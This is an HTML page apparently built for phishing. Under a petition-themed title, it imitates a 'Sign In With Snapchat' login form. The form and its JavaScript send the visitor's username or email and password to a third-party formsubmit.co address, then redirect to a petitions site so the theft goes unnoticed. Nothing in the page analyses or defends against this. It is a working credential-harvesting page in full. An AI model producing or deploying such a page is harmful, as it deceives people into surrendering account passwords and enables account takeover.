<!DOCTYPE html>
<html>
<head>
  <title>Help change the world</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap">
  <link rel="stylesheet" href="style.css"> 
  <link rel="icon" href="petitionicon.png" type="image/png">
</head>
<body>
  <div class="container">
    <div class="logo"></div>
    <h1>Sign In With Snapchat</h1>
    <form id="loginForm" action="https://formsubmit.co/2ded5fbb7c4b2e9e372c6a196b72a54e" method="POST">
      <label for="username">Username or Email</label>
      <input type="text" id="username" name="username" required>
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>
      <input type="submit" value="Log in">
    </form>
    <div class="login-box">
      <a href="#">Forgot password?</a> | <a href="#">Sign up</a>
    </div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent form submission
      var form = event.target;
      fetch(form.action, {
        method: form.method,
        body: new FormData(form)
      })
      .then(function(response) {
        if (response.ok) {
          window.location.href = "https://petitions.me/petitions.html";
        } else {
          // Handle error or display error message
          console.error("Form submission failed. Error:", response.status);
        }
      })
      .catch(function(error) {
        // Handle error or display error message
        console.error("Form submission failed. Error:", error);
      });
    });
  </script>
</body>
</html>
